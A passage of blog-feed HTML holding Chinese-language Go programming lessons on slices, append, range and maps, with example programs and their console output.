class="number">9</span>&#125;</span><br><span class="line">fmt.Println(<span class="string">"p =="</span>,p)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>;i &lt; <span class="built_in">len</span>(p) ;i++  &#123;</span><br><span class="line">fmt.Printf(<span class="string">"p[%d]==%d\n"</span>,i,p[i])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day3&gt;go run slice.go</span><br><span class="line">p == [2 3 4 5 6 7 8 9]</span><br><span class="line">p[0]==2</span><br><span class="line">p[1]==3</span><br><span class="line">p[2]==4</span><br><span class="line">p[3]==5</span><br><span class="line">p[4]==6</span><br><span class="line">p[5]==7</span><br><span class="line">p[6]==8</span><br><span class="line">p[7]==9</span><br></pre></td></tr></table></figure></div><h2 id="slice切片"><a href="#slice切片" class="headerlink" title="slice切片"></a>slice切片</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">silce 可以重新切片，创建一个新的slice值指向相同数组。</span><br><span class="line">s[1:5]</span><br><span class="line">表示从1到4（5-1）的slice元素，含两端。</span><br><span class="line">而s[1:1]则为空，s[1:1+1]则为新元素。</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">s := []<span class="keyword">int</span>&#123;<span class="number">2</span>,<span class="number">423</span>,<span class="number">22</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">56</span>,<span class="number">9</span>,<span class="number">29</span>&#125;</span><br><span class="line">fmt.Println(<span class="string">"s=="</span>,s)</span><br><span class="line">fmt.Println(<span class="string">"s[1:4]=="</span>,s[<span class="number">1</span>:<span class="number">4</span>])</span><br><span class="line"><span class="comment">//省略下标表示从0开始</span></span><br><span class="line">fmt.Println(<span class="string">"s[:5]=="</span>,s[:<span class="number">5</span>])</span><br><span class="line"><span class="comment">//省略上标表示到len(s）结束</span></span><br><span class="line">fmt.Println(<span class="string">"s[2:]"</span>,s[<span class="number">2</span>:])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day3&gt;go run slicing_slices.go</span><br><span class="line">s== [2 423 22 6 8 2 56 9 29]</span><br><span class="line">s[1:4]== [423 22 6]</span><br><span class="line">s[:5]== [2 423 22 6 8]</span><br><span class="line">s[2:] [22 6 8 2 56 9 29]</span><br></pre></td></tr></table></figure></div><h2 id="构造slice"><a href="#构造slice" class="headerlink" title="构造slice"></a>构造slice</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">slice 由函数 make 创建。这会分配一个零长度的数组并且返回一个 slice 指向这个数组：</span><br><span class="line">a := make([]int, 5)  // len(a)=5</span><br><span class="line">为了指定容量，可传递第三个参数到 `make`：</span><br><span class="line">b := make([]int, 0, 5) // len(b)=0, cap(b)=5</span><br><span class="line">b = b[:cap(b)] // len(b)=5, cap(b)=5</span><br><span class="line">b = b[1:]      // len(b)=4, cap(b)=4</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">a := <span class="built_in">make</span>([]<span class="keyword">int</span>,<span class="number">5</span>)</span><br><span class="line">printSlice(<span class="string">"a"</span>,a)</span><br><span class="line">b := <span class="built_in">make</span>([]<span class="keyword">int</span>,<span class="number">0</span>,<span class="number">5</span>)</span><br><span class="line">printSlice(<span class="string">"b"</span>,b)</span><br><span class="line">c := b[:<span class="number">2</span>]</span><br><span class="line">printSlice(<span class="string">"c"</span>,c)</span><br><span class="line">d := b[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">printSlice(<span class="string">"d"</span>,d)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printSlice</span><span class="params">(s <span class="keyword">string</span>,x []<span class="keyword">int</span>)</span></span>  &#123;</span><br><span class="line">fmt.Printf(<span class="string">"%s len=%d cap=%d %v\n"</span>,</span><br><span class="line">s, <span class="built_in">len</span>(x), <span class="built_in">cap</span>(x), x)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day3&gt;go run making_slice.go</span><br><span class="line">a len=5 cap=5 [0 0 0 0 0]</span><br><span class="line">b len=0 cap=5 []</span><br><span class="line">c len=2 cap=5 [0 0]</span><br><span class="line">d len=3 cap=3 [0 0 0]</span><br></pre></td></tr></table></figure></div><h2 id="nil-slice"><a href="#nil-slice" class="headerlink" title="nil slice"></a>nil slice</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">slice 的零值是nil</span><br><span class="line">一个nil的slice的长度和容量为0</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="keyword">var</span> z []<span class="keyword">int</span></span><br><span class="line">fmt.Println(z,<span class="built_in">len</span>(z),<span class="built_in">cap</span>(z))</span><br><span class="line"><span class="keyword">if</span> z == <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"nil!!!"</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day3&gt;go run nil_slice.go</span><br><span class="line">[] 0 0</span><br><span class="line">nil!!!</span><br></pre></td></tr></table></figure></div><h2 id="向slice添加元素（append）"><a href="#向slice添加元素（append）" class="headerlink" title="向slice添加元素（append）"></a>向slice添加元素（append）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">向 slice 添加元素是一种常见的操作，因此 Go 提供了一个内建函数 `append`。</span><br><span class="line">func append (s []T)</span><br><span class="line">append 的第一个参数 s 是一个类型为 T 的数组，其余类型为 T 的值将会添加到 slice。</span><br><span class="line">append 的结果是一个包含原 slice 所有元素加上新添加的元素的 slice。</span><br><span class="line">如果 s 的底层数组太小，而不能容纳所有值时，会分配一个更大的数组。 返回的 slice 会指向这个新分配的数组。</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="keyword">var</span> z []<span class="keyword">int</span></span><br><span class="line">printSlice(<span class="string">"z"</span>,z)</span><br><span class="line"></span><br><span class="line">z = <span class="built_in">append</span>(z,<span class="number">0</span>)</span><br><span class="line">printSlice(<span class="string">"z"</span>,z)</span><br><span class="line"></span><br><span class="line">z = <span class="built_in">append</span>(z,<span class="number">1</span>)</span><br><span class="line">printSlice(<span class="string">"z"</span>,z)</span><br><span class="line"></span><br><span class="line">z = <span class="built_in">append</span>(z,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">printSlice(<span class="string">"z"</span>,z)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printSlice</span><span class="params">(s <span class="keyword">string</span>,x []<span class="keyword">int</span>)</span></span>  &#123;</span><br><span class="line">fmt.Printf(<span class="string">"%s len=%d cap=%d %v\n"</span>,s,<span class="built_in">len</span>(x),<span class="built_in">cap</span>(x),x)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day3&gt;go run append.go</span><br><span class="line">z len=0 cap=0 []</span><br><span class="line">z len=1 cap=1 [0]</span><br><span class="line">z len=2 cap=2 [0 1]</span><br><span class="line">z len=6 cap=6 [0 1 2 3 4 5]</span><br></pre></td></tr></table></figure></div><h2 id="range"><a href="#range" class="headerlink" title="range"></a>range</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for 循环的 range 格式可以对 slice 或者 map 进行迭代循环。</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = []<span class="keyword">int</span>&#123;<span class="number">2</span>,<span class="number">35</span>,<span class="number">6</span>,<span class="number">125</span>,<span class="number">78</span>,<span class="number">9</span>,<span class="number">356</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="keyword">for</span> x,y := <span class="keyword">range</span> a&#123;</span><br><span class="line">fmt.Printf(<span class="string">"2**%d=%d\n"</span>,x,y)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day3&gt;go run range.go</span><br><span class="line">2**0=2</span><br><span class="line">2**1=35</span><br><span class="line">2**2=6</span><br><span class="line">2**3=125</span><br><span class="line">2**4=78</span><br><span class="line">2**5=9</span><br><span class="line">2**6=356</span><br></pre></td></tr></table></figure></div><h2 id="range-续"><a href="#range-续" class="headerlink" title="range(续)"></a>range(续)</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以通过赋值给 _ 来忽略序号和值。</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">pow := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i := <span class="keyword">range</span> pow &#123;</span><br><span class="line">pow[i] = <span class="number">1</span> &lt;&lt; <span class="keyword">uint</span>(i)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, value := <span class="keyword">range</span> pow &#123;</span><br><span class="line">fmt.Printf(<span class="string">"%d\n"</span>, value)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day3&gt;go run range_continued.go</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">4</span><br><span class="line">8</span><br><span class="line">16</span><br><span class="line">32</span><br><span class="line">64</span><br><span class="line">128</span><br><span class="line">256</span><br><span class="line">512</span><br></pre></td></tr></table></figure></div><h2 id="map"><a href="#map" class="headerlink" title="map"></a>map</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">map 映射键到值。</span><br><span class="line">map 在使用之前必须用 make 而不是 new 来创建；值为 nil 的 map 是空的，并且不能赋值。</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> test4 <span class="keyword">struct</span> &#123;</span><br><span class="line">lat,long <span class="keyword">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="keyword">string</span>]test4</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">m = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]test4)</span><br><span class="line">m[<span class="string">"FUN"</span>] = test4&#123;</span><br><span class="line"><span class="number">40.54412</span>,<span class="number">-884.4445554</span>,</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(m[<span class="string">"FUN"</span>])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day3&gt;go run map.go</span><br><span class="line">&#123;40.54412 -884.4445554&#125;</span><br></pre></td></tr></table></figure></div><h2 id="map文法"><a href="#map文法" class="headerlink" title="map文法"></a>map文法</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">map 的文法跟结构体文法相似，不过必须有键名。</span><br><span class="line">如果顶级的类型只有类型名的话，可以在文法的元素中省略键名。</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> test5 <span class="keyword">struct</span> &#123;</span><br><span class="line">x,y <span class="keyword">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> m  = <span class="keyword">map</span>[<span class="keyword">string</span>]test5&#123;</span><br><span class="line"><span class="string">"kali"</span> : test5&#123;</span><br><span class="line"><span class="number">123.456</span>,<span class="number">456.789</span>,</span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">"fun"</span> : test5&#123;</span><br><span class="line"><span class="number">789.123</span>,<span class="number">456.123</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//var m  = map[string]test5&#123;</span></span><br><span class="line"><span class="comment">//"kali" : &#123;123.456,456.789&#125;,</span></span><br><span class="line"><span class="comment">//"fun" : &#123;789.123,456.123&#125;,</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">fmt.Println(m)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day3&gt;go run map_literals.go</span><br><span class="line">map[kali:&#123;123.456 456.789&#125; fun:&#123;789.123 456.123&#125;]</span><br></pre></td></tr></table></figure></div><h2 id="修改map"><a href="#修改map" class="headerlink" title="修改map"></a>修改map</h2><h6 id="在map-m-中插入或者修改一个元素"><a href="#在map-m-中插入或者修改一个元素" class="headerlink" title="在map m 中插入或者修改一个元素"></a>在map m 中插入或者修改一个元素</h6><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m[key] = elem</span><br></pre></td></tr></table></figure></div><h6 id="获取元素："><a href="#获取元素：" class="headerlink" title="获取元素："></a>获取元素：</h6><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elem =  m[key]</span><br></pre></td></tr></table></figure></div><h6 id="删除元素："><a href="#删除元素：" class="headerlink" title="删除元素："></a>删除元素：</h6><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(m,key)</span><br></pre></td></tr></table></figure></div><h6 id="通过双赋值检测某个键值存在："><a href="#通过双赋值检测某个键值存在：" class="headerlink" title="通过双赋值检测某个键值存在："></a>通过双赋值检测某个键值存在：</h6><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elem,  ok = m[key]</span><br></pre></td></tr></table></figure></div><p>如果key在m中，则“ok”为“true”。不存在则为“false”，并且elem是map元素类型的零值。<br>同样，当从map中读取某个不存在的键值时，结果是map元素类型的零值。</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">q := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>)</span><br><span class="line"></span><br><span class="line">q[<span class="string">"fun"</span>] = <span class="number">45</span></span><br><span class="line">fmt.Println(q[<span class="string">"fun"</span>])</span><br><span class="line"></span><br><span class="line">q[<span class="string">"fun"</span>] = <span class="number">41</span></span><br><span class="line">fmt.Println(q[<span class="string">"fun"</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(q,<span class="string">"fun"</span>)</span><br><span class="line">fmt.Println(<span class="string">"the value:"</span>,q[<span class="string">"fun"</span>])</span><br><span class="line"></span><br><span class="line">v, ok := q[<span class="string">"fun"</span>]</span><br><span class="line">fmt.Println(<span class="string">"the value:"</span>,v,<span class="string">"really"</span>,ok)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">D:\go_sty\day3&gt;go run mutating_map.go</span><br><span class="line">45</span><br><span class="line">41</span><br><span class="line">the value: 0</span><br><span class="line">the value: 0 really false</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoLang_Day1</title>
      <link href="/2018/09/10/golang-day1/"/>
      <url>/2018/09/10/golang-day1/</url>
      
        <content type="html"><![CDATA[<h1 id="GoLang"><a href="#GoLang" class="headerlink" title="GoLang"></a>GoLang</h1><h2 id="创建hello-go"><a href="#创建hello-go" class="headerlink" title="创建hello.go"></a>创建hello.go</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">fmt.Println(<span class="string">"Hello"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="执行hello-go"><a href="#执行hello-go" class="headerlink" title="执行hello.go"></a>执行hello.go</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> run hello.<span class="keyword">go</span></span><br><span class="line">Hello</span><br></pre></td></tr></table></figure></div><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td 